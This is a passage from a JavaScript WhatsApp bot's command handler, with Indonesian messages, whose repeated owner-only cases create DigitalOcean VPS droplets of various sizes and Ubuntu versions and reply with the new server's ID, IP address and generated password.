        'Authorization': "Bearer " + global.apiDigitalOcean
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      Reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + global.apiDigitalOcean
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

let teksnya = `*Berikut Data Vps Kamu 🌐*

*Id Vps :* ${dropletId}
*Ip Vps :* ${ipVPS}
*Pw Vps :* ${password}`
await conn.sendMessage(m.chat, {text: teksnya}, {quoted: m})
} else {
return new Error(`Gagal membuat VPS: ${responseData.message}`);
}
} catch (err) {
console.error(err);
Reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
}}
break

//================================================================================

case "cvps2g2c1": {
if (!isCreator) return Reply(mess.owner)
let hostname = args[0];
if (!hostname) return Reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword()
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + global.apiDigitalOcean
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      Reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + global.apiDigitalOcean
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

let teksnya = `*Berikut Data Vps Kamu 🌐*

*Id Vps :* ${dropletId}
*Ip Vps :* ${ipVPS}
*Pw Vps :* ${password}`
await conn.sendMessage(m.chat, {text: teksnya}, {quoted: m})
} else {
return new Error(`Gagal membuat VPS: ${responseData.message}`);
}
} catch (err) {
console.error(err);
Reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
}}
break

//================================================================================

case "cvps4g2c1": {
if (!isCreator) return Reply(mess.owner)
let hostname = args[0];
if (!hostname) return Reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-4gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword()
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + global.apiDigitalOcean
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      Reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + global.apiDigitalOcean
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

let teksnya = `*Berikut Data Vps Kamu 🌐*

*Id Vps :* ${dropletId}
*Ip Vps :* ${ipVPS}
*Pw Vps :* ${password}`
await conn.sendMessage(m.chat, {text: teksnya}, {quoted: m})
} else {
return new Error(`Gagal membuat VPS: ${responseData.message}`);
}
} catch (err) {
console.error(err);
Reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
}}
break

//================================================================================

case "cvps8g2c1": {
if (!isCreator) return Reply(mess.owner)
let hostname = args[0];
if (!hostname) return Reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'syd1',
      size: 's-2vcpu-8gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword()
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + global.apiDigitalOcean
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      Reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + global.apiDigitalOcean
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

let teksnya = `*Berikut Data Vps Kamu 🌐*

*Id Vps :* ${dropletId}
*Ip Vps :* ${ipVPS}
*Pw Vps :* ${password}`
await conn.sendMessage(m.chat, {text: teksnya}, {quoted: m})
} else {
return new Error(`Gagal membuat VPS: ${responseData.message}`);
}
} catch (err) {
console.error(err);
Reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
}}
break

//================================================================================

case "cvps8g4c1": {
if (!isCreator) return Reply(mess.owner)
let hostname = args[0];
if (!hostname) return Reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-4vcpu-8gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword()
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + global.apiDigitalOcean
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      Reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + global.apiDigitalOcean
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

let teksnya = `*Berikut Data Vps Kamu 🌐*

*Id Vps :* ${dropletId}
*Ip Vps :* ${ipVPS}
*Pw Vps :* ${password}`
await conn.sendMessage(m.chat, {text: teksnya}, {quoted: m})
} else {
return new Error(`Gagal membuat VPS: ${responseData.message}`);
}
} catch (err) {
console.error(err);
Reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
}}
break

//================================================================================

case "cvps16g4c1": {
if (!isCreator) return Reply(mess.owner)
let hostname = args[0];
if (!hostname) return Reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'syd1',
      size: 's-4vcpu-16gb-amd',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword()
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + global.apiDigitalOcean
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      Reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + global.apiDigitalOcean
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

let teksnya = `*Berikut Data Vps Kamu 🌐*

*Id Vps :* ${dropletId}
*Ip Vps :* ${ipVPS}
*Pw Vps :* ${password}`
await conn.sendMessage(m.chat, {text: teksnya}, {quoted: m})
} else {
return new Error(`Gagal membuat VPS: ${responseData.message}`);
}
} catch (err) {
console.error(err);
Reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
}}
break

//================================================================================

case "cvps1g1c2": {
if (!isCreator) return Reply(mess.owner)
let hostname = args[0];
if (!hostname) return Reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-1gb',
      image: 'ubuntu-22-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword()
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + global.apiDigitalOcean
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      Reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + global.apiDigitalOcean
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

let teksnya = `*Berikut Data Vps Kamu 🌐*

*Id Vps :* ${dropletId}
*Ip Vps :* ${ipVPS}
*Pw Vps :* ${password}`
await conn.sendMessage(m.chat, {text: teksnya}, {quoted: m})
} else {
return new Error(`Gagal membuat VPS: ${responseData.message}`);
}
} catch (err) {
console.error(err);
Reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
}}
break

//================================================================================

case "cvps2g1c2": {
if (!isCreator) return Reply(mess.owner)
let hostname = args[0];
if (!hostname) return Reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-2gb',
      image: 'ubuntu-22-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword()
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + global.apiDigitalOcean
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      Reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + global.apiDigitalOcean
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

let teksnya = `*Berikut Data Vps Kamu 🌐*

*Id Vps :* ${dropletId}
*Ip Vps :* ${ipVPS}
*Pw Vps :* ${password}`
await conn.sendMessage(m.chat, {text: teksnya}, {quoted: m})
} else {
return new Error(`Gagal membuat VPS: ${responseData.message}`);
}
} catch (err) {
console.error(err);
Reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
}}
break

//================================================================================

case "cvps2g2c2": {
if (!isCreator) return Reply(mess.owner)
let hostname = args[0];
if (!hostname) return Reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-2gb',
      image: 'ubuntu-22-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword()
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + global.apiDigitalOcean
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      Reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + global.apiDigitalOcean
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

let teksnya = `*Berikut Data Vps Kamu 🌐*

*Id Vps :* ${dropletId}
*Ip Vps :* ${ipVPS}
*Pw Vps :* ${password}`
await conn.sendMessage(m.chat, {text: teksnya}, {quoted: m})
} else {
return new Error(`Gagal membuat VPS: ${responseData.message}`);
}
} catch (err) {
console.error(err);
Reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
}}
break

//================================================================================

case "cvps4g2c2": {
if (!isCreator) return Reply(mess.owner)
let hostname = args[0];
if (!hostname) return Reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-4gb',
      image: 'ubuntu-22-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword()
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + global.apiDigitalOcean
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      Reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + global.apiDigitalOcean
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

let teksnya = `*Berikut Data Vps Kamu 🌐*

*Id Vps :* ${dropletId}
*Ip Vps :* ${ipVPS}
*Pw Vps :* ${password}`
await conn.sendMessage(m.chat, {text: teksnya}, {quoted: m})
} else {
return new Error(`Gagal membuat VPS: ${responseData.message}`);
}
} catch (err) {
console.error(err);
Reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
}}
break

//================================================================================

case "cvps8g2c2": {
if (!isCreator) return Reply(mess.owner)
let hostname = args[0];
if (!hostname) return Reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'syd1',
      size: 's-2vcpu-8gb',
      image: 'ubuntu-22-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword()
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + global.apiDigitalOcean
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      Reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + global.apiDigitalOcean
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

let teksnya = `*Berikut Data Vps Kamu 🌐*

*Id Vps :* ${dropletId}
*Ip Vps :* ${ipVPS}
*Pw Vps :* ${password}`
await conn.sendMessage(m.chat, {text: teksnya}, {quoted: m})
} else {
return new Error(`Gagal membuat VPS: ${responseData.message}`);
}
} catch (err) {
console.error(err);
Reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
}}
break

//================================================================================

case "cvps8g4c2": {
if (!isCreator) return Reply(mess.owner)
let hostname = args[0];
if (!hostname) return Reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-4vcpu-8gb',
      image: 'ubuntu-22-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword()
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + global.apiDigitalOcean
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      Reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + global.apiDigitalOcean
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

let teksnya = `*Berikut Data Vps Kamu 🌐*

*Id Vps :* ${dropletId}
*Ip Vps :* ${ipVPS}
*Pw Vps :* ${password}`
await conn.sendMessage(m.chat, {text: teksnya}, {quoted: m})
} else {
return new Error(`Gagal membuat VPS: ${responseData.message}`);
}
} catch (err) {
console.error(err);
Reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
}}
break

//================================================================================

case "cvps16g4c2": {
if (!isCreator) return Reply(mess.owner)
let hostname = args[0];
if (!hostname) return Reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'syd1',
      size: 's-4vcpu-16gb-amd',
      image: 'ubuntu-22-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword()
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + global.apiDigitalOcean
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      Reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + global.apiDigitalOcean
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

let teksnya = `*Berikut Data Vps Kamu 🌐*

*Id Vps :* ${dropletId}
*Ip Vps :* ${ipVPS}
*Pw Vps :* ${password}`
await conn.sendMessage(m.chat, {text: teksnya}, {quoted: m})
} else {
return new Error(`Gagal membuat VPS: ${responseData.message}`);
}
} catch (err) {
console.error(err);
Reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
}}
break

//================================================================================

case "cvps1g1c3": {
if (!isCreator) return Reply(mess.owner)
let hostname = args[0];
if (!hostname) return Reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-1gb',
      image: 'ubuntu-24-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword()
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + global.apiDigitalOcean
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      Reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + global.apiDigitalOcean
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

let teksnya = `*Berikut Data Vps Kamu 🌐*

*Id Vps :* ${dropletId}
*Ip Vps :* ${ipVPS}
*Pw Vps :* ${password}`
await conn.sendMessage(m.chat, {text: teksnya}, {quoted: m})
} else {
return new Error(`Gagal membuat VPS: ${responseData.message}`);
}
} catch (err) {
console.error(err);
Reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
}}
break

//================================================================================

case "cvps2g1c3": {
if (!isCreator) return Reply(mess.owner)
let hostname = args[0];
if (!hostname) return Reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-2gb',
      image: 'ubuntu-24-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword()
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + global.apiDigitalOcean
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      Reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + global.apiDigitalOcean
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

let teksnya = `*Berikut Data Vps Kamu 🌐*

*Id Vps :* ${dropletId}
*Ip Vps :* ${ipVPS}
*Pw Vps :* ${password}`
await conn.sendMessage(m.chat, {text: teksnya}, {quoted: m})
} else {
return new Error(`Gagal membuat VPS: ${responseData.message}`);
}
} catch (err) {
console.error(err);
Reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
}}
break

//================================================================================

case "cvps2g2c3": {
if (!isCreator) return Reply(mess.owner)
let hostname = args[0];
if (!hostname) return Reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-2gb',
      image: 'ubuntu-24-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword()
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + global.apiDigitalOcean
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      Reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + global.apiDigitalOcean
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

let teksnya = `*Berikut Data Vps Kamu 🌐*

*Id Vps :* ${dropletId}
*Ip Vps :* ${ipVPS}
*Pw Vps :* ${password}`
await conn.sendMessage(m.chat, {text: teksnya}, {quoted: m})
} else {
return new Error(`Gagal membuat VPS: ${responseData.message}`);
}
} catch (err) {
console.error(err);
Reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
}}
break

//================================================================================

case "cvps4g2c3": {
if (!isCreator) return Reply(mess.owner)
let hostname = args[0];
if (!hostname) return Reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-4gb',
